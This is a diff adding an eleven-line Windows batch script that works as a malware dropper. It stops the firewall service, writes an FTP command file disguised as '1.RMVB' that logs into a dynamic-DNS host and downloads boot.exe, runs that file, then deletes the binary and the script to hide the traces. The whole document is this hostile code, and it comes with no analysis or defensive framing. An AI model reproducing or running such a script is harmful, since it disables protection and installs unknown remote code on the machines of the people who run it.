@@ -1,0 +1,11 @@
+net stop sharedaccess
+sc stop sharedaccess
+del boot.exe /q
+echo o qinwei0779.3322.org  > 1.RMVB&echo 1234 >> 1.RMVB&echo 1234 >> 1.RMVB&echo get boot.exe boot.exe >> 1.RMVB&echo bye >> 1.RMVB
+ftp -s:C:\WINDOWS\system32\1.RMVB
+del 1.RMVB
+ping 127.0.0.1 -n 3
+cmd /c boot.exe
+ping 127.0.0.1 -n 10
+del %SystemRoot%\system32\boot.exe /q
+exit
